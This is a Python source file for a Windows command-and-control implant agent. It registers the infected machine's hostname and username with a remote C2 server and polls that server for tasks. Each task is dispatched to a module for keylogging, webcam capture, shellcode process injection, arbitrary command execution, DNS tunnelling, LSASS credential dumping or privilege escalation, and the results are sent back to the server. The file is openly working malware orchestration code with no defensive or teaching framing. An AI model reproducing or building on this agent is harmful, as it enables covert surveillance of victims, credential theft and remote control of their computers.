import os
import sys
import platform
import uuid
import time
import random
import requests
import json
import logging
from cryptography.fernet import Fernet
import subprocess
import ctypes
import win32api
import win32con
import win32security
import win32process
import win32event
import win32service
import win32serviceutil
import win32timezone
import socket
import psutil
from datetime import datetime
import threading
from modules.evasion import Evasion
from modules.keylogger import Keylogger
from modules.webcam import WebcamCapture
from modules.process_injection import ProcessInjector
from modules.post_exploit import PostExploit
from modules.dns_tunnel import DNSTunnel
from modules.credential_dump import CredentialDump
from modules.priv_esc import PrivilegeEscalation

class Agent:
    def __init__(self, server_url, agent_id=None):
        self.server_url = server_url
        self.agent_id = agent_id or self.generate_agent_id()
        self.setup_logging()
        self.setup_modules()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('agent.log'),
                logging.StreamHandler()
            ]
        )
        
    def setup_modules(self):
        """Initialize all available modules"""
        self.evasion = Evasion()
        self.keylogger = Keylogger()
        self.webcam = WebcamCapture()
        self.process_injector = ProcessInjector()
        self.post_exploit = PostExploit()
        self.dns_tunnel = DNSTunnel("example.com")  # Replace with actual domain
        self.cred_dump = CredentialDump()
        self.priv_esc = PrivilegeEscalation()
        
    def generate_agent_id(self):
        """Generate unique agent ID"""
        return f"agent_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{os.getpid()}"
        
    def register(self):
        """Register agent with C2 server"""
        try:
            data = {
                'agent_id': self.agent_id,
                'hostname': os.getenv('COMPUTERNAME'),
                'username': os.getenv('USERNAME'),
                'os': sys.platform,
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.server_url}/api/agents/register",
                json=data
            )
            
            if response.status_code == 200:
                logging.info("Successfully registered with C2 server")
                return True
            else:
                logging.error(f"Failed to register: {response.text}")
                return False
                
        except Exception as e:
            logging.error(f"Error registering agent: {str(e)}")
            return False
            
    def get_tasks(self):
        """Get pending tasks from C2 server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/tasks/{self.agent_id}"
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                logging.error(f"Failed to get tasks: {response.text}")
                return None
                
        except Exception as e:
            logging.error(f"Error getting tasks: {str(e)}")
            return None
            
    def execute_task(self, task):
        """Execute received task"""
        try:
            task_type = task.get('type')
            task_data = task.get('data', {})
            task_id = task.get('id')
            
            result = None
            
            if task_type == 'keylogger':
                result = self.keylogger.start()
            elif task_type == 'webcam':
                result = self.webcam.capture()
            elif task_type == 'process_injection':
                result = self.process_injector.inject(
                    task_data.get('process'),
                    task_data.get('shellcode')
                )
            elif task_type == 'post_exploit':
                result = self.post_exploit.execute(task_data.get('command'))
            elif task_type == 'dns_tunnel':
                result = self.dns_tunnel.start_tunnel()
            elif task_type == 'credential_dump':
                result = self.cred_dump.dump_lsass()
            elif task_type == 'privilege_escalation':
                result = self.priv_esc.check_windows_services()
                
            # Send result back to server
            self.send_result(task_id, result)
            
        except Exception as e:
            logging.error(f"Error executing task: {str(e)}")
            self.send_result(task_id, {'error': str(e)})
            
    def send_result(self, task_id, result):
        """Send task result to C2 server"""
        try:
            data = {
                'task_id': task_id,
                'agent_id': self.agent_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.server_url}/api/results",
                json=data
            )
            
            if response.status_code != 200:
                logging.error(f"Failed to send result: {response.text}")
                
        except Exception as e:
            logging.error(f"Error sending result: {str(e)}")
            
    def run(self):
        """Main agent loop"""
        try:
            if not self.register():
                logging.error("Failed to register with C2 server")
                return
                
            while True:
                # Get pending tasks
                tasks = self.get_tasks()
                if tasks:
                    for task in tasks:
                        # Execute task in separate thread
                        thread = threading.Thread(
                            target=self.execute_task,
                            args=(task,),
                            daemon=True
                        )
                        thread.start()
                        
                # Sleep for a while before checking for new tasks
                time.sleep(5)
                
        except Exception as e:
            logging.error(f"Error in main loop: {str(e)}")
            
if __name__ == "__main__":
    # Replace with actual C2 server URL
    server_url = "http://localhost:5001"
    agent = Agent(server_url)
    agent.run() 